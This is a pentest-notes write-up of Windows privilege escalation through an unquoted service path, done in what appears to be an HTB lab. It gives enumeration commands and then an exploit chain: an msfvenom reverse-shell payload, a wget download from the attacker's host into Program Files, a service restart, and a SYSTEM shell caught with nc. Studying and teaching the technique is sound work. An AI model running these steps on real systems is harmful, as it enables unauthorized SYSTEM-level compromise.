---
title: Unquoted Service Path
date: 2026-06-16 19:24:15
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Services
tags:
  - msfvenom
  - wmic
  - icacls
  - Windows-Services
  - Unquoted-Service-Path
  - Service-Hijacking
  - Weak-Permissions
---

>➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM.
>
>➜ Example :
>
>➜ If the service binary path is :

```text
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

>➜ Windows will attempt to execute the following paths in order :
>
> \- `C:\Program.exe`
> \- `C:\Program Files.exe`
> \- `C:\Program Files (x86)\System.exe`
> \- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

# Enumeration

#### Enumerate Unquoted Service Paths

```cmd
C:\Users\htb-student>wmic service get name,displayname,startname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""

GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto

System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
Auto
```

```powershell
Get-CimInstance Win32_Service |
Where-Object {
    $_.StartMode -eq 'Auto' -and
    $_.PathName -notlike 'C:\Windows*' -and
    $_.PathName -match ' ' -and
    $_.PathName -notmatch '^"'
} |
Select Name, DisplayName, StartName, PathName

GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto

System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
Auto
```

>➜ As we can see, these two services have unquoted service paths and may be vulnerable to privilege escalation if writable directories are present.

#### Checking Directory Permissions

```powershell
PS C:\> icacls "C:\Program Files (x86)\System Explorer\service\"

C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)
                                                     Everyone:(I)(RX)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
```

```powershell
PS C:\> icacls "C:\Program Files (x86)\System Explorer"

C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)
                                                     Everyone:(I)(RX)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
```

```powershell
PS C:\> icacls "C:\Program Files (x86)\"

C:\Program Files (x86)\                              BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
```

> ➜ We have write permission on `C:\Program Files (x86)\`, allowing us to place a malicious executable in this directory.

# Exploiting the Unquoted Service Path

> Create malicious binary

```bash
➜  weak-permissions msfvenom -p windows/shell_reverse_tcp LHOST=Our-IP LPORT=Listening-Port -f exe > System.exe
```

> Transfer binary to target

```powershell
wget http://Our-IP:port/System.exe -O "C:\Program Files (x86)\System.exe"
```

> Restart the service

```powershell
sc.exe stop SystemExplorerHelpService
```

```powershell
sc.exe start SystemExplorerHelpService
```

> Get Reverse Shell

```bash
➜  weak-permissions rlwrap nc -lvnp 8888

C:\WINDOWS\system32> whoami
nt authority\system
```
